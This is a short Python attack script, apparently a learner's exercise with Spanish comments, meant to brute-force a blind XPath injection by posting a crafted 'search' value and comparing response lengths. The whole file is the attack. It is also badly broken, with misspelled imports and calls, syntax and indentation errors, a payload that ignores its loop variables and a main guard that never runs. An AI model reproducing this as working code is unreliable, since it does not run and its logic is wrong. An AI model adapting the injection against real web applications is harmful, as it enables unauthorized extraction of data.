#!/usr/bin/python3
from pwn import *
import sys
import time 
import request
import string
import pbd
import singal

def def_handler(sig, frame):
    print("\n\n[!] Saliendo..\n")
    sys.exit(1)
#Ctrl +C 
signal.singal(signal.SIGINT, def_handler)


#Variables Globales

main_url = "URL"
characters = string.ascii_letters


def xpath_Intection():
 
    data = ""
    
    p1 = log.progress("fuerza Bruta")
    p1.status("Empezando a romper to")

    time.sleep(2)

    p2 = log.progress("Data")

    for position in range(1,8):
        for character in characters:
            post_data = {
                    'search' "1' and substring(name(/*[1]),1,1)='C"
                    'submit' : ''
                    }

                 r = request.post(main_url, data=post_data)

                print(len(r,text)) 
                
                if len(r.text) != 8681:
                    data += characters
                    p2.status(data)
                    break

 
    if __name__ == '__name__':
        xpath_Intection
